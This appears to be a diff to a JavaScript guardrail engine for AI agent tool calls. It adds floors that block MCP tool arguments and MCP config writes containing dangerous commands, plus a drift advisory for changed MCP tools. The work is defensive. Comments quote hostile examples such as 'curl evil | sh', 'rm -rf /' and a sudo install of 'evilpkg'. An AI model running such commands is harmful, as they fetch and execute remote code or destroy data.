@@ -47,6 +47,8 @@ const _F20 = getEntry("F20");         // change-intent-drift (ADR-012)
 const _F21 = getEntry("F21");         // compaction-survival (ADR-016)
 const _F23 = getEntry("F23");         // data-flow-kill-chain (ADR-017)
 const _F24 = getEntry("F24");         // credential-persistence-write
+const _F25 = getEntry("F25");         // mcp-arg-danger
+const _F26 = getEntry("F26");         // mcp-registration-write
 const _CA  = getEntry("D-CONTRACT-ALLOW");  // contract-allow (sources[0/1])
 const _LA  = getEntry("D-LEARNED-ALLOW");   // learned-allow
 const _AAO = getEntry("D-AUTO-ALLOW-ONCE"); // auto-allow-once
@@ -124,6 +126,7 @@ const { classifyAmbientPath: _classifyAmbientPath, isAmbientPath: _isAmbientPath
 // lock owned by another agent/session for a write-like call.
 const { readLockState: _readLockState, findConflict: _findLockConflict } = require("./cross-agent-lock");
 const { stateDir: _statePathStateDir } = require("./state-paths");
+const { checkArgShapeDrift: _checkArgShapeDrift } = require("./mcp-pin");
 // ADR-004 PR 37B: degraded-mode descriptor + write-like classifier. The
 // descriptor is computed once per process from journal-chain.verify(); when
 // degraded, F4 operator-token demotion is suppressed and write-like `allow`
@@ -315,6 +318,75 @@ function buildEarlyBlock(reasonCode, enriched, discovered, input, explanation, e
   return result;
 }
 
+// buildEarlyReview — mirrors buildEarlyBlock but produces action:"require-review"
+// with riskLevel:"medium" / riskScore:5.  Used by F25/F26 when a payload is
+// unscannable (too complex / circular) — we gate rather than hard-block to
+// prevent false positives on large benign bulk payloads.
+function buildEarlyReview(reasonCode, enriched, discovered, input, explanation, extra = {}) {
+  const _code     = extra.code || floorCodeFor(reasonCode) || null;
+  const _degraded = extra.degradedMode !== undefined ? extra.degradedMode : _earlyBlockDegradedDefault;
+  // ADR-009 PR-C: carry ambient-touch fields into require-review receipts so
+  // audit can identify which ambient path was being touched when the gate fired.
+  // Mirrors the identical pattern in buildEarlyBlock (lines ~219-222).
+  const _ambientClass = extra.ambientClass || (extra.ambientTouch && extra.ambientTouch.class) || null;
+  const _ambientPath  = extra.ambientPath  || (extra.ambientTouch && extra.ambientTouch.path)  || null;
+  // ADR-017 F23: include kill-chain receipt when detection fired before this early review.
+  const _killChain    = _earlyBlockF23 || null;
+  const result = {
+    action: "require-review",
+    enforcementAction: "require-review",
+    floorFired: extra.floorFired || null,
+    ...(_code != null ? { code: _code } : {}),
+    riskScore: 5,
+    riskLevel: "medium",
+    reasonCodes: [reasonCode],
+    confidence: 0.5,
+    decisionSource: extra.decisionSource || "contract-floor",
+    policyKey: reasonCode,
+    explanation,
+    pendingSuggestion: null,
+    promotionGuidance: null,
+    promotionState: null,
+    promotionLifecycleSummary: null,
+    workflowRoute: null,
+    actionPlan: null,
+    trajectoryNudge: null,
+    envelope: input.envelope || null,
+    envelopeVerification: null,
+    networkEgress: null,
+    context: {},
+    ...(_ambientClass ? { ambientClass: _ambientClass } : {}),
+    ...(_ambientPath  ? { ambientPath:  _ambientPath  } : {}),
+    ...(_degraded    != null ? { degradedMode: _degraded } : {}),
+    ...(_killChain   != null ? { killChain: _killChain } : {}),
+  };
+  // ADR-016: dry-run mode skips journal/notify side-effects (sandbox previews).
+  if (_earlyBlockDryRun) return result;
+  try {
+    const irExtras = _irJournalExtras(input, result.floorFired);
+    append({
+      kind: "runtime-decision",
+      action: "require-review",
+      riskLevel: "medium",
+      riskScore: 5,
+      reasonCodes: [reasonCode],
+      tool: input.tool || "",
+      branch: input.branch || "",
+      targetPath: input.targetPath || "",
+      notes: `${result.decisionSource}:${reasonCode}`,
+      ...(result.floorFired ? { floorFired: result.floorFired } : {}),
+      ...(_ambientClass ? { ambientClass: _ambientClass } : {}),
+      ...(_ambientPath  ? { ambientPath:  _ambientPath  } : {}),
+      ...(_degraded    != null ? { degradedMode: _degraded } : {}),
+      ...(_killChain   != null ? { killChain:    _killChain } : {}),
+      ...(irExtras || {}),
+    });
+    recordDecision({ action: "require-review", riskLevel: "medium", reasonCodes: [reasonCode] });
+  } catch { /* journal is best-effort */ }
+  try { _fireNotifyHook(result, _earlyBlockContract, result.policyKey || null); } catch { /* */ }
+  return result;
+}
+
 // F16 (ADR-009 PR-B) — ambient-authority floor helpers. Pure; zero I/O.
 // Path normalization mirrors runtime/ambient.js (backslash→slash, strip
 // `file://`, trim trailing slash); comparisons lowercase for parity with
@@ -480,6 +552,164 @@ function _evalCredPersistFloor(input, contract) {
     return { fire: true, path, reason: highSens ? "high-sensitivity" : "persistence" };
   }
   return { fire: false };
+}
+
+// F25: mcp-arg-danger floor helpers. Pure; zero I/O.
+// Detects MCP tool calls whose argument payload contains a dangerous-command-
+// shaped string value (e.g. {command:"curl evil | sh"} or {exec:"rm -rf /"}).
+// Uses the same classifyCommand classifier already used for Bash commands so
+// pattern lists are never duplicated. Opt-out: if getMcpPolicy === "allow" the
+// server is explicitly trusted and the scan is skipped (same as F4 Task 3).
+// NODE_CAP: iterative walk limit for _extractStringValues.
+// Measured cost: ~0.4µs/node; p99 budget ~1.2ms, bench cap ~2.1ms.
+// 1,000 nodes → worst-case added latency ≈0.4ms, well within budget.
+const _ESV_NODE_CAP  = 1_000;
+// _RAW_SCAN_CAP: byte limit for the raw-value fallback in _evalMcpRegistrationFloor.
+// Caps the content slice scanned when JSON.parse fails (JSONC / non-strict JSON).
+// Aligned with F26 budget: 256KB is enough to cover any plausible hand-authored
+// .mcp.json while bounding worst-case regex/loop time to ~1ms.
+const _RAW_SCAN_CAP  = 262_144; // 256 KB
+
+function _extractStringValues(obj) {
+  // Iterative (non-recursive), cycle-safe string-value collector.
+  // Uses an explicit stack + WeakSet to skip already-visited objects.
+  // Returns { strings: string[], truncated: boolean }.
+  //   truncated=true  → node cap hit OR internal error; caller must gate
+  //                     rather than silently allow (fail-safe, not fail-open).
+  // Key anti-FP principle: truncation does NOT hard-block.  A benign bulk
+  // payload with no dangerous string found before the cap → require-review
+  // (gate), not block.  Danger buried past the cap → also require-review.
+  // This is correct and intentional.
+  try {
+    const strings = [];
+    const visited = new WeakSet();
+    const stack   = [obj];
+    let   nodes   = 0;
+    while (stack.length > 0) {
+      if (++nodes > _ESV_NODE_CAP) return { strings, truncated: true };
+      const cur = stack.pop();
+      if (typeof cur === "string") { strings.push(cur); continue; }
+      if (cur === null || typeof cur !== "object") continue;
+      if (visited.has(cur)) continue;
+      visited.add(cur);
+      if (Array.isArray(cur)) {
+        for (let i = cur.length - 1; i >= 0; i--) stack.push(cur[i]);
+      } else {
+        const vals = Object.values(cur);
+        for (let i = vals.length - 1; i >= 0; i--) stack.push(vals[i]);
+      }
+    }
+    return { strings, truncated: false };
+  } catch {
+    // Belt-and-suspenders: any unexpected internal error → truncated=true
+    return { strings: [], truncated: true };
+  }
+}
+const _GATED_CMD_CLASSES = new Set([
+  "destructive-delete", "force-push", "remote-exec",
+  "hard-reset", "disk-write", "sudo",
+]);
+function _evalMcpArgFloor(input, contract, enriched) {
+  try {
+    // 1. Gate: MCP tools only
+    if (enriched?.ir?.toolKind !== "mcp" && !String(input.tool || "").startsWith("mcp__")) return { fire: false };
+
+    // 2. Opt-out: explicitly allowed servers skip this floor
+    const mcpSrv = (enriched?.ir?.mcpServer) || _contractExtractMcpServerName(input.tool);
+    if (_contractGetMcpPolicy(contract, mcpSrv) === "allow") return { fire: false };
+
+    // 3. Extract all string values from the arg payload
+    const rawArgs = input.tool_input ?? input.args ?? input.params;
+    if (!rawArgs) return { fire: false };
+    const { strings: argStrings, truncated: argTruncated } = _extractStringValues(rawArgs);
+
+    // 4. Check each string against the dangerous-command classifier
+    for (const argStr of argStrings) {
+      const cls = classifyCommand(argStr);
+      if (_GATED_CMD_CLASSES.has(cls)) {
+        return { fire: true, reason: `command-class=${cls}`, arg: argStr.slice(0, 80) };
+      }
+    }
+    // 5. Fail-safe on truncation: payload too complex to fully scan → require-review gate.
+    //    Truncation does NOT hard-block (anti-FP principle: benign bulk must not block).
+    if (argTruncated) return { unscannable: true, reason: "arg-payload-too-complex" };
+    return { fire: false };
+  } catch { return { fire: false }; } // fail-open
+}
+
+// F26: mcp-registration-write floor helpers. Pure; zero I/O.
+// Content-aware second line after F16 (ambient-authority). Fires when a
+// file-write tool call targets an MCP config path AND the written JSON
+// content registers a server with a dangerous-command-shaped launch command.
+// Fires even when F16 has been opted out via scopes.ambient.allow. Default-
+// deny; opt out via contract scopes.files.allow glob list.
+function _evalMcpRegistrationFloor(input, contract) {
+  try {
+    // 1. Gate: file-write tools only (Edit/Write or toolKind==="file-write")
+    const tool = String(input.tool || "");
+    if (tool !== "Write" && tool !== "Edit" && input.ir?.toolKind !== "file-write") return { fire: false };
+
+    // 2. Collect write target path
+    const targetPath = input.targetPath || input.file_path || input.path || "";
+    if (!targetPath) return { fire: false };
+
+    // 3. Check if target is an MCP config path (mcpConfig ambient class)
+    if (_classifyAmbientPath(targetPath) !== "mcpConfig") return { fire: false };
+
+    // 4. Opt-out: contract scopes.files.allow glob matches the target → skip
+    const allow = contract && contract.scopes && contract.scopes.files && Array.isArray(contract.scopes.files.allow)
+      ? contract.scopes.files.allow : null;
+    if (allow && allow.some((pat) => { try { return _globMatch(targetPath, pat); } catch { return false; } })) {
+      return { fire: false };
+    }
+
+    // 5. Get the write content
+    const content = input.content ?? input.new_string ?? input.file_text ?? "";
+    if (!content) return { fire: false };
+
+    // 6. Parse content as JSON; on failure use raw-value fallback for JSONC / trailing commas.
+    let parsed;
+    let useRawFallback = false;
+    try { parsed = JSON.parse(content); }
+    catch { useRawFallback = true; }
+
+    if (!useRawFallback) {
+      // Structured path: walk parsed JSON, classify each string value.
+      const { strings, truncated: cfgTruncated } = _extractStringValues(parsed);
+      for (const str of strings) {
+        const cls = classifyCommand(str);
+        if (_GATED_CMD_CLASSES.has(cls)) {
+          return { fire: true, reason: cls, command: str.slice(0, 80) };
+        }
+      }
+      // Fail-safe on truncation: config too complex to fully scan → require-review gate.
+      if (cfgTruncated) return { unscannable: true, reason: "content-too-complex" };
+      return { fire: false };
+    }
+
+    // Raw-value fallback for non-strict JSON (JSONC with // comments, trailing commas, partial writes).
+    // IMPORTANT: extract quoted STRING VALUES then classify each — do NOT line-scan.
+    // Rationale: classifyCommand's sudo rule is ^\s*sudo-anchored. A naive line-scan of
+    //   "command":"sudo apt-get install evilpkg"
+    // starts with `"command"`, not `sudo`, so the anchor would never fire. By extracting the
+    // VALUE (`sudo apt-get install evilpkg`) first we correctly match the anchor.
+    const scanText = content.length > _RAW_SCAN_CAP ? content.slice(0, _RAW_SCAN_CAP) : content;
+    // If content is large enough to require slicing, we may miss danger past the cap.
+    // Rather than fail-open, we fail-safe: if we scan the full slice and find nothing,
+    // but the content was oversized, return unscannable → require-review (not allow).
+    const contentWasTruncated = content.length > _RAW_SCAN_CAP;
+    const literals = scanText.match(/"(?:[^"\\]|\\.)*"/g) || [];
+    let n = 0;
+    for (const lit of literals) {
+      if (++n > _ESV_NODE_CAP) return { unscannable: true, reason: "content-too-complex" };
+      let val;
+      try { val = JSON.parse(lit); } catch { val = lit.slice(1, -1); } // unescape or strip quotes
+      const cls = classifyCommand(String(val));
+      if (_GATED_CMD_CLASSES.has(cls)) return { fire: true, reason: cls, command: String(val).slice(0, 80) };
+    }
+    if (contentWasTruncated) return { unscannable: true, reason: "oversize-mcp-config" };
+    return { fire: false };
+  } catch { return { fire: false }; } // fail-open
 }
 
 // F19 (ADR-010) — output-channel-exfiltration floor. Classifier + floor
@@ -1122,6 +1352,83 @@ function decide(input = {}) {
     }
   } catch { /* fail-open per zero-dep policy */ }
 
+  // F25: mcp-arg-danger floor — rung 17.65, after F24 and before F17. Fires
+  // when an MCP tool call's argument payload contains a dangerous-command-
+  // shaped string value (e.g. {command:"curl evil | sh"}, {exec:"rm -rf /"}).
+  // An MCP tool whose arg IS a dangerous command is as dangerous as a direct
+  // Bash call. Default-deny; opt out via scopes.mcp[server].policy=allow.
+  // Fail-open on internal throw.
+  try {
+    const f25 = _evalMcpArgFloor(input, contract, enriched);
+    if (f25 && f25.fire) {
+      return buildEarlyBlock(
+        "mcp-arg-danger-denied", enriched, discovered, input,
+        `MCP arg contains dangerous command pattern: ${f25.reason}`,
+        { floorFired: _F25.name, decisionSource: _F25.source, ambientTouch: _ambientTouch }
+      );
+    }
+    if (f25 && f25.unscannable) {
+      return buildEarlyReview(
+        "mcp-arg-shape-unscannable", enriched, discovered, input,
+        `MCP arg payload too complex to fully scan: ${f25.reason}`,
+        { floorFired: _F25.name, decisionSource: _F25.source, ambientTouch: _ambientTouch }
+      );
+    }
+  } catch { /* fail-open */ }
+
+  // F26: mcp-registration-write floor — rung 17.6875, after F25 and before
+  // F17. Content-aware second line after F16 (ambient-authority). Fires when
+  // a file-write to an MCP config path registers a server with a dangerous-
+  // command-shaped launch command. Fires even when F16 has been opted out via
+  // scopes.ambient.allow. Default-deny; opt out via scopes.files.allow.
+  // Fail-open on internal throw.
+  try {
+    const f26 = _evalMcpRegistrationFloor(input, contract);
+    if (f26 && f26.fire) {
+      return buildEarlyBlock(
+        "mcp-registration-write-denied", enriched, discovered, input,
+        `MCP config write registers server with dangerous command: ${f26.reason}`,
+        { floorFired: _F26.name, decisionSource: _F26.source, ambientTouch: _ambientTouch }
+      );
+    }
+    if (f26 && f26.unscannable) {
+      return buildEarlyReview(
+        "mcp-config-unscannable", enriched, discovered, input,
+        `MCP config content too complex to fully scan: ${f26.reason}`,
+        { floorFired: _F26.name, decisionSource: _F26.source, ambientTouch: _ambientTouch }
+      );
+    }
+  } catch { /* fail-open */ }
+
+  // mcp-tool-drift (rug-pull / behavioral pin): observe-only advisory.
+  // Checks whether an MCP tool's argument shape has changed since first seen.
+  // Fires flag-only: attaches a `mcpToolDrift` advisory field on the result
+  // but NEVER changes `action`, `source`, or `floorFired`. Fail-open.
+  let _mcpToolDrift = null;
+  try {
+    const _isMcpCall = (enriched.ir && enriched.ir.toolKind === "mcp") ||
+                       String(input.tool || "").startsWith("mcp__");
+    if (_isMcpCall && !_earlyBlockDryRun) {
+      const _mcpSrv  = (enriched.ir && enriched.ir.mcpServer) ||
+                       _contractExtractMcpServerName(input.tool);
+      const _toolName = String(input.tool || "");
+      const _args     = input.tool_input ?? input.args ?? input.params ?? null;
+      const _driftResult = _checkArgShapeDrift({
+        server: _mcpSrv || _toolName,
+        tool: _toolName,
+        args: _args,
+      });
+      if (_driftResult.drift) {
+        _mcpToolDrift = {
+          code:   "mcp-tool-drift",
+          server: _mcpSrv || null,
+          tool:   _toolName,
+          reason: _driftResult.reason || "arg-shape changed",
+        };
+      }
+    }
+  } catch { /* fail-open: rug-pull detection must never block the engine */ }
+
   // F17 PR-A: cross-agent-lock floor — rung 17.75, after F16 and before
   // contract-allow demotion. Fires when a write-like call targets a
   // path/project already held by a different agent's lock that is not
@@ -1374,8 +1681,14 @@ function decide(input = {}) {
       // by F4 just like a command string carrying the same content.
       if (!secretInCommand && (enriched.ir?.toolKind === "mcp" || String(input.tool || "").startsWith("mcp__"))) {
         try {
-          const mcpPayload = JSON.stringify(input.tool_input ?? input.args ?? input.params ?? "");
-          secretInCommand = Boolean(_scanSecrets(mcpPayload));
+          // NEW (Task 3): if contract explicitly allows this MCP server, skip secret scan —
+          // credential args are legitimate for trusted servers (DB connectors, secrets managers, etc.).
+          const mcpSrv = enriched.ir?.mcpServer || _contractExtractMcpServerName(input.tool);
+          if (_contractGetMcpPolicy(contract, mcpSrv) !== "allow") {
+            const mcpPayload = JSON.stringify(input.tool_input ?? input.args ?? input.params ?? "");
+            secretInCommand = Boolean(_scanSecrets(mcpPayload));
+            // policy === "allow" → server explicitly trusted; credential args legitimate, skip scan
+          }
         } catch { /* scan or serialize unavailable — skip */ }
       }
     }
@@ -1659,6 +1972,7 @@ function decide(input = {}) {
   if (intentResult.intent !== "unknown") explanationParts.push(`intent=${intentResult.intent}`);
   if (validityWarning) explanationParts.push("validity-warn=outside-window");
   if (mcpWarning)            explanationParts.push(`mcp-warn=${mcpWarning.name}`);
+  if (_mcpToolDrift)         explanationParts.push(`mcp-tool-drift=${_mcpToolDrift.tool}`);
   if (skillWarning)          explanationParts.push(`skill-warn=${skillWarning.name}`);
   if (sessionDurationWarning) explanationParts.push(`session-over-duration=age:${sessionDurationWarning.ageMin}min/limit:${sessionDurationWarning.limitMin}min`);
   if (input.envelope?.hash) explanationParts.push(`envelope=${input.envelope.hash}`);
@@ -1750,6 +2064,9 @@ function decide(input = {}) {
     ...(mcpWarning            ? { mcpWarning }            : {}),
     ...(skillWarning          ? { skillWarning }          : {}),
     ...(sessionDurationWarning ? { sessionDurationWarning } : {}),
+    // mcp-tool-drift: rug-pull advisory field. Present only when arg-shape
+    // drift was detected for this MCP tool call. Flag-only — action unchanged.
+    ...(_mcpToolDrift ? { mcpToolDrift: _mcpToolDrift } : {}),
     // ADR-009 PR-C: receipt enrichment on every ambient-touch decision.
     ...(_ambientTouch.class ? { ambientClass: _ambientTouch.class } : {}),
     ...(_ambientTouch.path  ? { ambientPath:  _ambientTouch.path  } : {}),
@@ -1799,6 +2116,7 @@ function decide(input = {}) {
       ...(mcpWarning            ? { mcpWarning }            : {}),
       ...(skillWarning          ? { skillWarning }          : {}),
       ...(sessionDurationWarning ? { sessionDurationWarning } : {}),
+      ...(_mcpToolDrift ? { mcpToolDrift: _mcpToolDrift } : {}),
       ...(_ambientTouch.class ? { ambientClass: _ambientTouch.class } : {}),
       ...(_ambientTouch.path  ? { ambientPath:  _ambientTouch.path  } : {}),
       ...(_degradedReceiptMarker ? { degradedMode: _degradedReceiptMarker } : {}),
